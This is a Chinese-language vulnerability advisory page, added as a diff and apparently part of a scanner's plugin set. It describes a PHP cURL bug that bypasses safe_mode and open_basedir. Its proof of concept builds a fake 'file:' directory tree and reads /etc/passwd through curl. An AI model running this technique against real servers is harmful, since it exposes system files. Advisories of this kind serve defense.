@@ -1,0 +1,240 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/m.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">PHP cURL safe_mode和open_basedir绕过安全限制漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。 <br />
+
+									<br />
+
+									PHP支持libcurl库，用户可以使用各种类型的协议连接到不同类型的服务器。curl函数在检查safe_mode和open_basedir限制时存在漏洞，可能允许用户绕过安全限制执行非授权操作。例如对于以下代码：<br />
+
+									<br />
+
+									curl_setopt($ch, CURLOPT_URL, &quot;file:file:////etc/passwd&quot;);<br />
+
+									<br />
+
+									curl首先对以下内容检查safe_mode和open_basedir：<br />
+
+									<br />
+
+									&quot;file:////etc/passwd&quot; <br />
+
+									<br />
+
+									接下来读取：<br />
+
+									<br />
+
+									&quot;file:////etc/passwd&quot;<br />
+
+									<br />
+
+									如果恶意用户创建了类似于以下的虚拟树：<br />
+
+									<br />
+
+									./file:/<br />
+
+									./file:/etc/<br />
+
+									./file:/etc/passwd/<br />
+
+									<br />
+
+									/etc/hosts示例：<br />
+
+									<br />
+
+									./file:/<br />
+
+									./file:/etc/<br />
+
+									./file:/etc/hosts/<br />
+
+									<br />
+
+									创建特殊的子目录就可以以其他用户权限执行文件。<br />
+
+									<br />
+
+									- ---EXAMPLE-EXPLOIT---<br />
+
+									mkDIR(&quot;file:&quot;);<br />
+
+									chdir(&quot;file:&quot;);<br />
+
+									mkDIR(&quot;etc&quot;);<br />
+
+									chdir(&quot;etc&quot;);<br />
+
+									mkDIR(&quot;passwd&quot;);<br />
+
+									chdir(&quot;..&quot;);<br />
+
+									chdir(&quot;..&quot;);<br />
+
+									<br />
+
+									$ch = curl_init();<br />
+
+									<br />
+
+									curl_setopt($ch, CURLOPT_URL, &quot;file:file:////etc/passwd&quot;);<br />
+
+									curl_setopt($ch, CURLOPT_HEADER, 0);<br />
+
+									<br />
+
+									curl_exec($ch);<br />
+
+									<br />
+
+									curl_close($ch);<br />
+
+									- ---EXAMPLE-EXPLOIT---<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									PHP<br />
+
+									---<br />
+
+									建议升级PHP产品至最新版本，请到厂商的主页下载：<br />
+
+									<br />
+
+									http://www.php.net<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>4</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2009-04-13</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2013-11-25</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/34475" target="_blank">34475</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=13204" target="_blank">13204</a>
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
